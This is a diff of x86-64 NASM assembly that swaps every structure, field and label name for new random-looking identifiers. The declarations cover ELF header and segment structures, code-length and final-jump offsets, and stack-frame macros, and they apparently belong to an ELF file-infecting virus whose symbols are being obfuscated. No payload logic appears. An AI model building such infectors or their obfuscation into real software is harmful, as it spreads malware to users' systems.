@@ -32,42 +32,42 @@
 %define  SEEK_SET   0x0
 %define  SEEK_END   0x2
 
-%define  FAM(x)    [(rbp - EjCzV7zWv_size) + x]
-%define  INF(x)    [(rbp - sdo0BysL8f_size) + x]
+%define  FAM(x)    [(rbp - vIpwyUO8_size) + x]
+%define  INF(x)    [(rbp - Hp2r39UiMa_size) + x]
 
 
-%define  CODE_LEN  (gLj4boEu - _start)
-%define  FINJMP_OFF  (vESv6z - _start)
+%define  CODE_LEN  (sffRnF - _start)
+%define  FINJMP_OFF  (Y8U3P - _start)
 %define  PAGE_SIZE  0x1000
 
 
-struc EjCzV7zWv
-.pa98hvWY             resq    1
-.SJTK2          resq    1
-.QpxZLmj                 resq    1
-.W25WTT:           resb    PAGE_SIZE
-.RwFtnZJB:        resd    1
-.f1d0FF:     resd    1
-.zvSUIpXjJ resq    1
-.rRcDlhMrQ resq 1
+struc vIpwyUO8
+.JVrBRyDiHX             resq    1
+.r6ieUyrMx          resq    1
+.DmWCpO9p0X                 resq    1
+.TSyoY9O:           resb    PAGE_SIZE
+.gFNJOS:        resd    1
+.gQwXpO:     resd    1
+.yHYam1PN3q resq    1
+.UFNesJv4q resq 1
 endstruc
 
-struc sdo0BysL8f
-.q7UhD3H7S   resq 1
-.PEi4ySPjb2   resq 1
-.rRcDlhMrQ   resq 1
-.CxsCJPQD    resb 1
-.URL1aZ  resq 1
-.r27Xqje resq 1
-.kmMNfSQg resq 1
-.gzUNX  resq 1
-.WJ3l4MziY  resq 1 
-.ZF0R4vA  resq 1
-.UKgLYq3  resq 1
-.gCa451   resb 1
-.jbuURm   resq 1
-.uIqfv  resq 1
-.uz4bjvMW0  resq 1
+struc Hp2r39UiMa
+.MAo60   resq 1
+.pNsDtvOr   resq 1
+.UFNesJv4q   resq 1
+.VeISq2    resb 1
+.CheopBjw  resq 1
+.r7B5uVRYUF resq 1
+.dPrJVU resq 1
+.R44md3  resq 1
+.mQ7QAI0n  resq 1 
+.vAk49lW  resq 1
+.Tdlff  resq 1
+.lCqTjEOuD   resb 1
+.Ic9xq   resq 1
+.sCmR3fA8I  resq 1
+.lQgLUT  resq 1
 endstruc
 
 ; ELF structures
@@ -82,51 +82,51 @@ endstruc
 %define SHF_ALLOC 0x2
 %define SHF_EXECINSTR 0x4
 
-struc pRBkUrO5
-.iiEYNm6B:  resb 16
-.Q3TUyKy:  resw 1
-.cGlFDep:  resw 1
-.i3RtkL:  resd 1
-.jPUACXO4wu:  resq 1
-.PpDoFWp:  resq 1
-.GcnemzIA:  resq 1
-.RW4XC:  resd 1
-.G5tg0WG:  resw 1
-.EfUtwjonZ: resw 1
-.Df0PttR7O:  resw 1
-.JUgG3Q: resw 1
-.o64cTvXn:  resw 1
-.k6oBVH: resw 1
+struc h2viU9O
+.Pmxcf:  resb 16
+.LwLh2w:  resw 1
+.V7vKIn2W:  resw 1
+.CjM40qm:  resd 1
+.XNvDp:  resq 1
+.P4fER3Gm8m:  resq 1
+.pCtMgY:  resq 1
+.Fn9Mcz:  resd 1
+.RlPfN49IG:  resw 1
+.VWJMFA0c: resw 1
+.h2FSBoG:  resw 1
+.xRXeqLTa: resw 1
+.aoWnmX:  resw 1
+.XcGmvzZ: resw 1
 endstruc
 
-struc KlRU8
-.xXBiSq:  resd 1
-.Gpf3h00m3:  resd 1
-.KY1FY:  resq 1
-.hMiLM8:  resq 1
-.eaXpnLdaO7:  resq 1
-.zIxMP2:  resq 1
-.SZmjGzMVKM:  resq 1
-.unJFClezF:  resq 1
+struc qtnMX2NULe
+.ngVI1xF:  resd 1
+.a28Bo:  resd 1
+.BYNKkr:  resq 1
+.kdixMj:  resq 1
+.mh61y:  resq 1
+.Hhvm9Q0pHM:  resq 1
+.tEUTYFr8:  resq 1
+.u2fIzVy:  resq 1
 endstruc
 
-struc i1swc
-.QrFgJ:  resd 1
-.bJMwnS:  resd 1
-.gkrCtNMOvY:  resq 1
-.SUJg152kSB:  resq 1
-.LZZBS2jcgT:  resq 1
-.ewzLE:  resq 1
-.IFTJkFiQW:  resd 1
-.lRMl9V:  resd 1
-.KVG8EcI90 resq 1
-.v0dtZ  resq 1
+struc PNvMO0
+.Gwfyka:  resd 1
+.rnIwV:  resd 1
+.KPrIusqHE:  resq 1
+.XSvoqKsb:  resq 1
+.ZFmTx:  resq 1
+.qjUZ9VvHE:  resq 1
+.tMYONU:  resd 1
+.ppWbf3:  resd 1
+.fcdJckT resq 1
+.bUJ1ey0  resq 1
 endstruc
 
-struc ZeWhXHc2
-.qeFhnkkY  resq 1
-.Ve93gvw   resq 1
-.Pt2cBmMRz  resq 1
+struc CIJ5l
+.ueylOXGQkU  resq 1
+.l2cA81MO   resq 1
+.cCKbZ6BPbL  resq 1
 endstruc
 
 %macro PUSHA 0
